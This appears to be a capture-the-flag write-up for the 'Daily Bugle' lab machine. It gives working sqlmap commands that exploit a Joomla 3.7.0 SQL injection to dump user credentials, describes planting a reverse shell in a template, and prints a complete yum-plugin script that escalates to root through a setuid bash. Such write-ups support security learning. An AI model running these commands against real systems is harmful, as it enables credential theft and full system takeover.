+++
title = "Daily Bugle"
date = "2026-07-24"
author = "berzrk"
description = "Joomla SQL injection to RCE, then root via sudo yum"
+++

# Enumeration

From the port scan we can identify a webpage using **Joomla** and a MySQL/MariaDB.

Following the guide on [Joomla Discovery/Footprinting](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html?highlight=joomla#version), we can find the version at
`/administrator/manifests/files/joomla.xml`

We get **Joomla 3.7.0**

# Accessing Admin Dashboard

With a version in hand, we can look for an exploit. We find that it's vulnerable
to SQL Injection: `searchsploit -p php/webapps/42033.txt`

The exploit gives us the first commands to use with `sqlmap`

```bash
export IP=192.168.1.1

# Find databases
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering]

# Find tables inside the DB 'joomla'
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla --tables

# Find the columns for the users table
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla \
-T "#__users" --columns

# Dump the username,password
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" \
-C username,password --dump
```

We get a hash for the user `jonah` which we can crack. With these credentials we
can login to the dashboard.

# Shell as `apache`

With access to the admin dashboard, we can get **RCE** by modifying a template.

We find the template that is in use and insert a reverse shell in one of the
files (e.g. `index.php` from the theme Protostar).

# Shell as `jjameson`

Looking at the Apache configuration at `/var/www/html/configuration.php`, we
find credentials which we can use to ssh into `jjameson` and get the first
flag.

# Shell as `root`

Running `sudo -l` we get:

```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Based on GTFOBins, we can get `root` with:

```bash
cat >/tmp/x<<EOF
[main]
plugins=1
pluginpath=/tmp/
pluginconfpath=/tmp/
EOF

cat >/tmp/y.conf<<EOF
[main]
enabled=1
EOF

cat >/tmp/y.py<<EOF
import yum
import os
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
 os.system('cp /bin/bash /tmp')
 os.system('chmod +s /tmp/bash')
EOF

sudo yum -c /tmp/x --enableplugin=y

/tmp/bash -p
# root
```
